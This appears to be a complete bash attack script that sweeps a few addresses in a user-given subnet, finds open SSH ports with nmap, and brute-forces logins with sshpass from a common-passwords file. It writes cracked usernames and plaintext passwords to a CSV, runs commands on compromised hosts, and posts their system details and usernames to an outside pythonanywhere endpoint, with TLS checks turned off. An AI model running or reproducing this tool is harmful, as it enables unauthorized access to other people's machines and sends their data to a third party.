!/bin/bash

read -p "Enter IP Class (e.g., 192.168.1): " ip_class
output_file="ssh_results.csv"
common_passwords_file="common_passwords.csv"

echo "IP Address,Username,Password,Status" > $output_file

for i in {130..135}; do
    ip_address="$ip_class.$i"
    if ping -c 1 $ip_address &> /dev/null; then
        echo "IP address $ip_address is active"
        open_ports=$(nmap -p 22 --open --max-retries 1 --host-timeout 100ms $ip_address | grep ^[0-9] | cut -d '/' -f 1)
        if [ -n "$open_ports" ]; then
            echo "Open SSH port(s) on $ip_address: $open_ports"
            while IFS=$' \t\n\r' read -r username password; do
                sshpass -p "$password" ssh "$username@$ip_address" "lscpu | head -n 14 | tail -n 1 ; free | head -n 2 ; uname -a" > Infos.txt
	        if [ $? -eq 0 ]; then
                    status="Success"
                    echo "SSH connection to $ip_address with username $username and password $password: $status"
                    echo "Result of ifconfig on $ip_address:"
                    echo "$ip_address,$username,$password,$status" >> $output_file
		    mapfile -t info_lines < Infos.txt
	       	    x1="${info_lines[0]}"
		    x2="${info_lines[1]}"
		    x3="${info_lines[2]}"
		    x4="${info_lines[3]}"
		    x5="${ip_address}"
		    x6="${username}"
		    echo "$x2"    
		    		    
		    json_data=$(jq -n \
		    --arg cpu_model "$x1" \
		    --arg memory_information "$x3" \
		    --arg system_information "$x4" \
		    --arg ip_address "$x5" \
		    --arg username "$x6" \
	           '{
	            cpu_model: $cpu_model,
		    memory_information: $memory_information,
		    system_information: $system_information,
		    ip_address: $ip_address,
		    username: $username
		    }')
	            responce=$(curl --location --request POST 'https://securityfirstproject.pythonanywhere.com/post-info/' --header 'Content-Type: application/json' \
              	    --header 'Cookie: csrftoken=JyyEaDZY916tITOdAlkylNn8mGJmsX8y' \
		    --data "$json_data" -k)
		    echo "$responce"
                    if [$? -eq 0]; then 
			echo "Data posted succesfully"
		    else
			echo "Data didn't post"
		    fi
                else
                    status="Failed"
                    echo "SSH connection to $ip_address with username $username and password $password: $status"
                    echo "$ip_address,$username,$password,$status" >> $output_file
                fi

           done < "$common_passwords_file"
        else
            echo "No open SSH port found on $ip_address"
        fi
    else
        echo "IP address $ip_address is inactive"
    fi
done
echo "SSH connection test results saved in $output_file"

